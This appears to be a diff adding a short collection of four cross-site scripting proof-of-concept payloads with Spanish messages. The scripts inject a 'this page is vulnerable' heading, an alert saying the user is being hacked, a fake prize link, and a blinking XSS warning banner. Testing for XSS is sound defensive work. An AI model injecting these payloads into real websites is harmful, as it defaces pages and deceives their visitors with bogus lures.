@@ -1,0 +1,24 @@
+1:
+<script>
+let elem = "<h1 align='center' style='color:red;'><i>Esta pagina es vulnearable</i></h1>";
+document.write(elem)
+</script>
+
+2:
+<script>
+alert("Estas siendo hackeado")
+</script>
+
+3:
+<script>
+let elem = "<h3><a style='color:red;' href='https://www.amazon.com.mx/'>Click aqui para ganar increibles premios!</a></h3>";
+document.write(elem)
+</script>
+
+4:
+<script>
+document.write("<div id='blink' style='color:red; background-color:yellow; text-align:center'>Vulnerable a XSS CUIDADO!</div>");
+let blinkdiv = document.getElementById('blink');
+let isVisible = true;
+setInterval(function(){if(isVisible){blink.style.visibility = 'hidden';} else {blink.style.visibility = 'visible';} isVisible=!isVisible;}, 500);
+</script>
